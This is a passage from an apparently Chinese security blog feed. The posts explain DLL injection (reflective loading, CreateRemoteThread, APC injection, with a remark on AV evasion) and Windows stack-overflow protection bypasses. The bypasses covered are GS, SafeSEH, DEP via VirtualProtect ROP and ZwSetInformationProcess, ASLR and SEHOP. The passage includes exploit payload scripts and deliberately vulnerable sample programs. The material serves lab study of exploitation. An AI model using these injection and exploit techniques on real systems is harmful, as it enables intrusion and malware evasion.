library address...</span></span><br><span class="line">lpReflectiveLoader = (LPTHREAD_START_ROUTINE)( (ULONG_PTR)lpRemoteLibraryBuffer + dwReflectiveLoaderOffset );</span><br><span class="line"></span><br><span class="line"><span class="comment">// create a remote thread in the host process to call the ReflectiveLoader!</span></span><br><span class="line">hThread = <span class="built_in">CreateRemoteThread</span>( hProcess, <span class="literal">NULL</span>, <span class="number">1024</span>*<span class="number">1024</span>, lpReflectiveLoader, lpParameter, (DWORD)<span class="literal">NULL</span>, &amp;dwThreadId );</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">while</span>( <span class="number">0</span> );</span><br></pre></td></tr></table></figure><p><code>lpBuffer</code>就是读取到内存中的DLL的数据</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// uiNameArray = the address of the modules export directory entry</span></span><br><span class="line">uiNameArray = (UINT_PTR)&amp;((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// get the File Offset of the export directory</span></span><br><span class="line">uiExportDir = uiBaseAddress + <span class="built_in">Rva2Offset</span>( ((PIMAGE_DATA_DIRECTORY)uiNameArray)-&gt;VirtualAddress, uiBaseAddress );</span><br><span class="line"></span><br><span class="line"><span class="comment">// get the File Offset for the array of name pointers</span></span><br><span class="line">uiNameArray = uiBaseAddress + <span class="built_in">Rva2Offset</span>( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfNames, uiBaseAddress );</span><br><span class="line"></span><br><span class="line"><span class="comment">// get the File Offset for the array of addresses</span></span><br><span class="line">uiAddressArray = uiBaseAddress + <span class="built_in">Rva2Offset</span>( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfFunctions, uiBaseAddress );</span><br><span class="line"></span><br><span class="line"><span class="comment">// get the File Offset for the array of name ordinals</span></span><br><span class="line">uiNameOrdinals = uiBaseAddress + <span class="built_in">Rva2Offset</span>( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfNameOrdinals, uiBaseAddress );</span><br><span class="line"></span><br><span class="line"><span class="comment">// get a counter for the number of exported functions...</span></span><br><span class="line">dwCounter = ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;NumberOfNames;</span><br><span class="line"></span><br><span class="line"><span class="comment">// loop through all the exported functions to find the ReflectiveLoader</span></span><br><span class="line"><span class="keyword">while</span>( dwCounter-- )</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> * cpExportedFunctionName = (<span class="type">char</span> *)(uiBaseAddress + <span class="built_in">Rva2Offset</span>( <span class="built_in">DEREF_32</span>( uiNameArray ), uiBaseAddress ));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="built_in">strstr</span>( cpExportedFunctionName, <span class="string">&quot;ReflectiveLoader&quot;</span> ) != <span class="literal">NULL</span> )</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// get the File Offset for the array of addresses</span></span><br><span class="line">uiAddressArray = uiBaseAddress + <span class="built_in">Rva2Offset</span>( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfFunctions, uiBaseAddress );</span><br><span class="line"></span><br><span class="line"><span class="comment">// use the functions name ordinal as an index into the array of name pointers</span></span><br><span class="line">uiAddressArray += ( <span class="built_in">DEREF_16</span>( uiNameOrdinals ) * <span class="built_in">sizeof</span>(DWORD) );</span><br><span class="line"></span><br><span class="line"><span class="comment">// return the File Offset to the ReflectiveLoader() functions code...</span></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">Rva2Offset</span>( <span class="built_in">DEREF_32</span>( uiAddressArray ), uiBaseAddress );</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// get the next exported function name</span></span><br><span class="line">uiNameArray += <span class="built_in">sizeof</span>(DWORD);</span><br><span class="line"></span><br><span class="line"><span class="comment">// get the next exported function name ordinal</span></span><br><span class="line">uiNameOrdinals += <span class="built_in">sizeof</span>(WORD);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p><code>GetReflectiveLoaderOffset</code>就是解析文件头找到DLL的导出表，如果发现<code>ReflectiveLoader</code>的函数，那么返回在<code>hProcess</code>的内存文件中的位置</p><p>然后回到<code>LoadRemoteLibraryR</code>使用<code>CreateRemoteThread</code>进行注入</p><p>关于RVA和VA的计算可以参考我很早写的一篇博客：<a href="https://www.jianshu.com/p/231206f9fbaf">PE文件结构中的RVA与RAW</a></p><p>现在可以看一下他的DLL是如何构造的</p><p>首先存在一个导出函数</p><p><img src="https://img.joe1sn.top/uploads/big/5f38a3c3481e227dd4bc7785f3ab41ca.png" alt="image-20230718084605818" /></p><p>通过阅读这个函数的代码发现</p><ol><li>使用<code>_ReturnAddress</code>获得调用完成的返回地址，反推初DLL的基地址</li><li>通过PEB得到<code>LoadLibraryA</code>、<code>GetProcAddress</code>、<code>VirtualAlloc</code>，使用<code>NtFlushInstructionCache</code>暂时存储其他导入表的函数</li><li>迁移之前的DLL镜像到新的位置</li><li>覆写迁移后的文件头的节区位置</li><li>使用刚才导入的<code>LoadLibraryA</code>、<code>GetProcAddress</code>修复IAT</li><li>处理重定向相关</li><li>找到DLLMain并跳转后执行</li></ol><h1 id="apc注入"><a class="markdownIt-Anchor" href="#apc注入"></a> APC注入</h1><p>在最开始的远程线程调用注入使用的是<code>TH32CS_SNAPPROCESS</code>，这里就是利用<code>KiUserDispatch</code>调度进行APC例程调用，让线程使用<code>LoadLibarary</code>进行注入</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">THREADENTRY32 te = &#123; <span class="built_in">sizeof</span>(THREADENTRY32) &#125;;</span><br><span class="line">HANDLE hThreadSnap = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPTHREAD, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (INVALID_HANDLE_VALUE == hThreadSnap) &#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;Error In APC Injection\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">BOOL bStat = FALSE;</span><br><span class="line"><span class="comment">//得到第一个线程</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">Thread32First</span>(hThreadSnap, &amp;te)) &#123;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (te.th32OwnerProcessID == <span class="keyword">this</span>-&gt;dwPid) &#123;</span><br><span class="line">HANDLE hThread = <span class="built_in">OpenThread</span>(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);</span><br><span class="line"><span class="keyword">if</span> (hThread) &#123;</span><br><span class="line">DWORD dwRet = <span class="built_in">QueueUserAPC</span>((PAPCFUNC)LoadLibraryW, hThread, (ULONG_PTR)pAddress);</span><br><span class="line"><span class="keyword">if</span> (dwRet &gt; <span class="number">0</span>)bStat = TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="built_in">Thread32Next</span>(hThreadSnap, &amp;te));</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">CloseHandle</span>(hThreadSnap);</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/54c47164be9d9b6e6bf4a8a34377b787.png" alt="image-20230718092010464" /></p><p>还有一个技巧就是使用NTDLL中的未导出函数<code>NtTestAlert</code>就可以立即调用APC例程</p><p><strong>上面的把<code>hProcess = GetCurrentProcess()</code>，<code>pAddress = shellcode_Address</code>相当于使用DLL注入进行免杀了</strong></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;DLL 注入进化史&lt;/p&gt;</summary>
    
    
    
    <category term="program" scheme="https://joe1sn.eu.org/categories/program/"/>
    
    
    <category term="malware" scheme="https://joe1sn.eu.org/tags/malware/"/>
    
    <category term="C" scheme="https://joe1sn.eu.org/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>【Win Pwn】基础栈溢出保护绕过</title>
    <link href="https://joe1sn.eu.org/2023/07/12/win-pwn-stack2/"/>
    <id>https://joe1sn.eu.org/2023/07/12/win-pwn-stack2/</id>
    <published>2023-07-12T14:29:58.000Z</published>
    <updated>2023-07-13T12:25:05.423Z</updated>
    
    <content type="html"><![CDATA[<p>针对栈攻击的防护与绕过</p><span id="more"></span><h1 id="gs"><a class="markdownIt-Anchor" href="#gs"></a> GS</h1><p>GS本质上和Linux GCC中的canary很相似，他在栈帧的结尾（EBP之前）插入一给<code>DWORD</code>类型的值，其副本存在于<code>.data</code>中。</p><p><img src="https://img.joe1sn.top/uploads/big/b3c288e6425290fda519c82da1cad2d8.png" alt="image-20230712223606947" /></p><p>在编译的时候并不会存在GS保护有下面几种情况</p><ul><li>函数不包含缓冲区</li><li>函数被定义为具有变量参数列表</li><li>函数使用无保护的关键字标记</li><li>函数在第一个语句中包含内嵌汇编代码</li><li>缓冲区不是 8 字节类型且大小不大于 4 个字节</li></ul><p>不过仍然可以采用<code>#pragma strict_gs_check </code>强制启用GS保护</p><p><img src="https://img.joe1sn.top/uploads/big/750aa691ce894524469f1b01cd77e309.png" alt="image-20230712230456568" /></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;string.h&quot;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">vulfuction</span><span class="params">(<span class="type">char</span>* str)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> arry[<span class="number">4</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(arry, str);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span>* str = <span class="string">&quot;yeah,i have GS protection&quot;</span>;</span><br><span class="line">vulfuction(str);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/51469c6f21d21998618b65975dac846d.png" alt="image-20230712231538824" /></p><p><img src="https://img.joe1sn.top/uploads/big/374afa04add92f9d9522083ab2cb45ac.png" alt="image-20230712231847170" /></p><p>绕过方式要漏洞类型灵活选择</p><ul><li><p>如果是可以泄露那么泄露后拼接再溢出</p></li><li><p>再C++中，<code>struct</code>和<code>class</code>除了访问权限没有不同，那么有机会可以通过修改函数指针（比如虚函数）来进行RCE</p></li><li><p>如果存在任意地址写或者能过写道<code>.data</code>段（比如存在字符串格式化漏洞），可以将对比的cookie设置为特定值</p><p><img src="https://img.joe1sn.top/uploads/big/2b71e1f69270fdfb33074a2c981321bc.png" alt="image-20230713081622450" /></p><p><img src="https://img.joe1sn.top/uploads/big/acce2fb38f039e66a5257f69f0ee9336.png" alt="image-20230713082958542" /></p></li><li><p>GS机制没有存在SEH的保护，所以 <strong>【Win Pwn】基础栈溢出利用</strong> 中的利用手段仍然能够成功，只是溢出长度和ROP的Gadget需要重新设置。</p><p><img src="https://img.joe1sn.top/uploads/big/1e013c016c634b7c9b510528f57f7f11.png" alt="image-20230713000747391" /></p><p><img src="https://img.joe1sn.top/uploads/big/db77970446f88fc23cfb89501cc7f235.png" alt="image-20230713000801579" /></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">shellcode = <span class="string">b&quot;&quot;</span></span><br><span class="line">offset = <span class="string">b&quot;A&quot;</span>*(<span class="number">0x160</span>-<span class="built_in">len</span>(shellcode)-<span class="number">16</span>) <span class="comment">#0x1c</span></span><br><span class="line">test_func = <span class="string">b&quot;\xc4\x16\x40\x00&quot;</span> <span class="comment">#004016C4</span></span><br><span class="line">NSEH = <span class="string">b&quot;\xeb\x06\x90\x90&quot;</span>      <span class="comment">#asm(&quot;jmp 6;nop;nop&quot;)</span></span><br><span class="line">gadget = <span class="string">b&quot;\x9e\x26\x41\x00&quot;</span>    <span class="comment">#0041269E</span></span><br><span class="line"></span><br><span class="line">self_gadget = <span class="string">b&quot;\x89\xE0\x05\x2c\x07\x00\x00\xFF\xE0&quot;</span></span><br><span class="line">                                                        <span class="comment"># mov eax, esp</span></span><br><span class="line">                                                        <span class="comment"># sub eax, 0x64c;//sub eax, 0x608</span></span><br><span class="line">                                                        <span class="comment"># jmp eax</span></span><br><span class="line">payload = <span class="string">b&quot;\xaa&quot;</span>*<span class="number">16</span>+shellcode+offset+NSEH+gadget+self_gadget</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;password.txt&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(payload)</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/2a8a0b38238c8d4b55c053daf8d7f822.png" alt="image-20230713081020816" /></p></li></ul><h1 id="safeseh"><a class="markdownIt-Anchor" href="#safeseh"></a> SafeSEH</h1><p>0day那本书上信息有点…过时了，这里可以参考微软的官方定义<a href="https://learn.microsoft.com/zh-cn/cpp/build/reference/safeseh-image-has-safe-exception-handlers?view=msvc-170"><code>/SAFESEH</code>（映像具有安全异常处理程序）</a>，主要识别方法就是在<code>.rdata</code>中存在<code>IMAGE_LOAD_CONFIG_DIRECTORY32_2</code></p><p><img src="https://img.joe1sn.top/uploads/big/79a4334e1d29d557df4e66527b98c69a.png" alt="image-20230713090918752" /></p><p>通过<code>RtlDispatchException</code>函数实现</p><p><img src="https://img.joe1sn.top/uploads/big/dae06c1a5f9088ea1eed84fbfbbfca68.png" alt="image-20230713091103788" /></p><p>比较通杀的方法就是</p><ul><li>不使用SEH</li><li>在堆区上布置shellcode然后执行</li></ul><p>这里改动一下源代码</p><ol><li><p>把SEH的地址手动改为堆地址</p><p><img src="https://img.joe1sn.top/uploads/big/e8047ce0aa682162a04e464d06cb447e.png" alt="image-20230713093246026" /></p></li><li><p>经过校验后直接到堆中执行了</p><p><img src="https://img.joe1sn.top/uploads/big/23640b0c2f51bb770ee04be0cd63bf20.png" alt="image-20230713093529382" /></p><p><img src="https://img.joe1sn.top/uploads/big/5b3318808a12b59116c30bef0ff5c1ac.png" alt="image-20230713093751706" /></p><p>P3是重启了一次后截图，地址可能会不一样</p></li></ol><p>总结一下就是地址的ROP必须符合验证的权限，但是<strong>没有开启SafeSEH的DLL文件中的Gadget</strong>、没有<strong>DEP时候的堆地址</strong>都可以使用。</p><h1 id="dep"><a class="markdownIt-Anchor" href="#dep"></a> DEP</h1><p>DEP是类似于Windows上的NX，作用是禁止堆栈的数据拥有执行的权限，避免了Shellcode直接执行。</p><p>操作系统通过设置内存页的 NX/XD 属性标记，来指明不能从该内存执行代码。为了实现 这个功能，需要在内存的页面表（Page T able）中加入一个特殊的标识位（NX/XD）来标识是 否允许在该页上执行指令。当该标识位设置为 0 里表示这个页面允许执行指令，设置为 1 时表 示该页面不允许执行指令。</p><p>关于NX保护也可以手动查看</p><p><img src="https://img.joe1sn.top/uploads/big/e91415d0cafe28798ab17cbdfff475bb.png" alt="image-20230713095059334" /></p><p>只编译DEP可能还需要关闭运行时检查</p><p><img src="https://img.joe1sn.top/uploads/big/2ace5c957abc3787e65922ccf1a7e343.png" alt="image-20230713133201425" /></p><p>主要思路就是Ret2Libc</p><ul><li><p>调用<code>ZwSetInformationProcess</code>关闭DEP</p><p>在之前的《【win内核原理与实现】II. 进程与线程》中提到过<code>_KPROCESS</code>存在<code>ExecuteOptions</code></p><p><img src="https://img.joe1sn.top/uploads/big/b4d51d5aa29ea68f1f9a32053f3e6b20.png" alt="image-20230713100758503" /></p><p>我并没有在微软的官网上找到该结构体的说明，但是可以通过之前他们的逆向结果找到</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Pos0 ExecuteDisable        :<span class="number">1b</span>it </span><br><span class="line">Pos1 ExecuteEnable         :<span class="number">1b</span>it </span><br><span class="line">Pos2 DisableThunkEmulation :<span class="number">1b</span>it </span><br><span class="line">Pos3 Permanent             :<span class="number">1b</span>it </span><br><span class="line">Pos4 ExecuteDispatchEnable :<span class="number">1b</span>it </span><br><span class="line">Pos5 ImageDispatchEnable   :<span class="number">1b</span>it </span><br><span class="line">Pos6 Spare                 :<span class="number">2b</span>it</span><br></pre></td></tr></table></figure><p>当前进程 DEP 开启时 ExecuteDisable 位被置 1，当 进程 DEP 关闭时 ExecuteEnable 位被置 1，DisableThunkEmulation 是为了兼容 ATL 程序设置的， Permanent 被置 1 后表示这些标志都不能再被修改。真正影响 DEP 状态是前两位，所以我们只 要将_KEXECUTE_OPTIONS 的值设置为 0x02（二进制为 00000010）就可以将 ExecuteEnable 置为 1。</p><p>使用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ULONG ExecuteFlags = MEM_EXECUTE_OPTION_ENABLE; </span><br><span class="line">ZwSetInformationProcess( </span><br><span class="line"> NtCurrentProcess(),    <span class="comment">// (HANDLE)-1 </span></span><br><span class="line"> ProcessExecuteFlags,   <span class="comment">// 0x22 </span></span><br><span class="line"> &amp;ExecuteFlags,         <span class="comment">// ptr to 0x2 </span></span><br><span class="line"> <span class="keyword">sizeof</span>(ExecuteFlags)); <span class="comment">// 0x4 </span></span><br></pre></td></tr></table></figure><p>就可以关掉DEP保护了，在0day书中介绍了3种直接利用兼容性异常而导致DEP关闭的方法</p><blockquote><p>（1）当 DLL 受 SafeDisc 版权保护系统保护时；</p><p>（2）当 DLL 包含有.aspcak、.pcle、.sforce 等字节时；</p><p>（3）Windows V ista 下面当 DLL 包含在注册表“HKEY_LOCAL_MACHINE\SOFTWARE  \Microsoft\ Windows NT\CurrentVersion\Image File Execution Options\DllNXOptions”键下边标识 出不需要启动 DEP 的模块时</p></blockquote><p>很可惜在windows10中这些情况几乎不会出现，所以方法不适用</p></li></ul><p>这两种是我比较喜欢用的，因为可以和免杀结合在一起</p><p>他们的基础就是类似LinuxPwn中的ROP构造，这里我使用的是32下，cdcle调用方式，使用栈传参</p><ul><li><p><code>VirtualProtect</code>改写内存权限</p><p>关于函数的用法：<a href="https://learn.microsoft.com/zh-cn/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect">virtualProtect 函数 (memoryapi.h)</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">VirtualProtect</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]  LPVOID lpAddress,</span></span><br><span class="line"><span class="params">  [in]  SIZE_T dwSize,</span></span><br><span class="line"><span class="params">  [in]  DWORD  flNewProtect,</span></span><br><span class="line"><span class="params">  [out] PDWORD lpflOldProtect</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p><code>lpAddress</code>:  要改变属性的内存起始地址。</p><p><code>dwSize</code>:  要改变属性的内存区域大小。</p><p><code>flNewProtect</code>:  内存新的属性类型，设置为 PAGE_EXECUTE_READWRITE（0x40）时该 内存页为可读可写可执行。</p><p><code>pflOldProtect</code>:  内存原始属性类型保存地址。 修改内存属性成功时函数返回非 0，修改失败时返回 0。</p><p>不过API位于的是<code>shell32.dll</code>当中，所以要添加上<code>HINSTANCE hInst = LoadLibrary(L&quot;shell32.dll&quot;);</code></p><p>由于ROP依赖于函数调用的传参方式，下面是一个经典的传参</p><p><img src="https://img.joe1sn.top/uploads/big/ed81eaf5da5e42ca1bfb625c694f5216.png" alt="image-20230713193232979" /></p><p>ROP时栈的结构</p><p><img src="https://img.joe1sn.top/uploads/big/54294658ba1a5556fff36100908b0736.png" alt="image-20230713193507826" /></p><p>由于没有泄露点，所以只能在调试的时候修改。也可以使用Gadget来构造，比如说通过<code>ESP</code>相关得到栈地址之类的。（但是得到<code>VirtualProtect</code>就太困难了）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">offset = <span class="string">b&quot;A&quot;</span>*<span class="number">0x14</span></span><br><span class="line">payload = offset </span><br><span class="line">payload += <span class="string">b&quot;\x90&quot;</span>*<span class="number">4</span>    <span class="comment">#VirtualProtect</span></span><br><span class="line">payload += <span class="string">b&quot;\x80&quot;</span>*<span class="number">4</span>    <span class="comment">#Shellcode Address</span></span><br><span class="line">payload += <span class="string">b&quot;\x80&quot;</span>*<span class="number">4</span>    <span class="comment">#Shellcode Address</span></span><br><span class="line">payload += <span class="string">b&quot;\xff\x00\x00\x00&quot;</span>  <span class="comment">#Address Length</span></span><br><span class="line">payload += <span class="string">b&quot;\x40\x00\x00\x00&quot;</span>  <span class="comment">#PAGE_EXECUTE_READWRITE</span></span><br><span class="line">payload += <span class="string">b&quot;\x38\xa0\x41\x00&quot;</span>  <span class="comment">#0041A038</span></span><br><span class="line">payload += shellcode</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;password.txt&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(payload)</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/a68c0c2af42ae0d17c84c82d9d2db5b0.png" alt="image-20230713195003967" /></p></li><li><p><code>VirtualAlloc</code>来开辟可执行的内存然后执行shellcode</p><p>和<code>VirtualProtect</code>一样的道理，不过需要使用复制的payload将shellcode复制到可执行的内存中</p></li></ul><h1 id="aslr"><a class="markdownIt-Anchor" href="#aslr"></a> ASLR</h1><p>在绕过DEP保护中需要调试的时候才能写入函数地址的原因就是这些函数的DLL使用了ASLR保护，导致函数每次加载的基地址不同，所以无法使用固定地址。</p><p>绕过思路主要有</p><ul><li>低位覆盖，最低位是固定的</li><li>堆喷，将内存初始化后的<code>\x0c</code>强制写为<code>\x90</code>（<code>nop</code>的汇编），这样程序进入了任意的地址都能滑行到shellcode。（扩大伤害面）</li></ul><h1 id="sehop"><a class="markdownIt-Anchor" href="#sehop"></a> SEHOP</h1><p>由于SEH是链式的，所以他会顺着链表检查，如果最后一个不为系统固定的终极异常处理函数就直接不执行。</p><p><img src="https://img.joe1sn.top/uploads/big/5319fbefe0a46939d4d853e4debc9e4f.png" alt="image-20230713201332561" /></p><p>最直接有效的就是伪造SEH链，由于只会验证最后一个，只满足这个条件就可以了</p><p>由于SEHOP在SafeSEH之前，所以绕过过后还需要继续绕过SafeSEH</p><p><img src="https://img.joe1sn.top/uploads/big/f99910e357fc63d939677ac967101038.png" alt="image-20230713201648035" /></p><h1 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h1><p>《0day安全：软件漏洞分析技术》</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;针对栈攻击的防护与绕过&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="windows" scheme="https://joe1sn.eu.org/tags/windows/"/>
    
    <category term="pwn" scheme="https://joe1sn.eu.org/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>【Win Pwn】基础栈溢出利用</title>
    <link href="https://joe1sn.eu.org/2023/07/08/win-pwn-stack/"/>
    <id>https://joe1sn.eu.org/2023/07/08/win-pwn-stack/</id>
    <published>2023-07-08T08:39:36.000Z</published>
    <updated>2023-07-08T10:18:47.929Z</updated>
    
    <content type="html"><![CDATA[<p>[Win Pwn] 基础栈溢出利用</p><p>window下无保护的栈溢出加载shellcode</p><span id="more"></span><h1 id="程序"><a class="markdownIt-Anchor" href="#程序"></a> 程序</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> password[<span class="number">6</span>] = <span class="string">&quot;ABCDE&quot;</span>;</span><br><span class="line"><span class="type">char</span> str[<span class="number">6</span>];</span><br><span class="line">FILE *fp;</span><br><span class="line"><span class="keyword">if</span>(!(fp=fopen(<span class="string">&quot;password.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)))</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="built_in">fscanf</span>(fp,<span class="string">&quot;%s&quot;</span>,str);</span><br><span class="line"></span><br><span class="line">str[<span class="number">5</span>]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(str,password)==<span class="number">0</span>)</span><br><span class="line"><span class="comment">// fprintf(stderr,&quot;OK.\n&quot;);</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;OK.\n&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="comment">// fprintf(stderr,&quot;NO.\n&quot;);</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;NO.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">vuln();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span 